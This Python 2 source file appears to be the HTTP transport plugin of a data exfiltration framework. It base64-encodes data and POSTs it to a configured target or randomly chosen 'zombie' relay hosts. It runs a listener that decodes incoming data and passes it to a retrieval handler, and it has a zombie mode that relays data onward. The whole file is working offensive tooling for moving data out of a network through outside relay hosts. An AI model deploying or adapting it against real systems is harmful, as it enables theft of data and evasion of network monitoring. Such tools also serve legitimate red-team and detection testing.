import requests
import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
from random import choice

config = None
app_exfiltrate = None

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        self._set_headers()
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        tmp = post_body.split('=')
        if (tmp[0] == "data"):
            try:
                data = base64.b64decode(urllib.unquote(tmp[1]))
                self.server.handler(data)
            except Exception, e:
                print e
                pass

    def do_GET(self):
        string = '/'.join(self.path.split('/')[1:])
        self._set_headers()
        try:
            data = base64.b64decode(string)
            self.server.handler(data)
        except Exception, e:
            pass

def send(data):
    targets = [config['target']] + config['zombies']
    target = "http://{}:{}".format(choice(targets), config['port'])
    app_exfiltrate.log_message(
        'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
    data_to_send = {'data': base64.b64encode(data)}
    requests.post(target, data=data_to_send)

def relay_http_request(data):
    target = "http://{}:{}".format(config['target'], config['port'])
    app_exfiltrate.log_message(
        'info', "[zombie] [http] Relaying {0} bytes to {1}".format(len(data), target))
    data_to_send = {'data': base64.b64encode(data)}
    requests.post(target, data=data_to_send)

def server(data_handler):
    try:
        server_address = ('', config['port'])
        httpd = HTTPServer(server_address, S)
        httpd.handler = data_handler
        httpd.serve_forever()
    except:
        app_exfiltrate.log_message(
            'warning', "[http] Couldn't bind http daemon on port {}".format(config['port']))

def listen():
    app_exfiltrate.log_message('info', "[http] Starting httpd...")
    server(app_exfiltrate.retrieve_data)

def zombie():
    app_exfiltrate.log_message('info', "[zombie] [http] Starting httpd...")
    server(relay_http_request)

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('http', {'send': send, 'listen': listen, 'zombie': zombie})
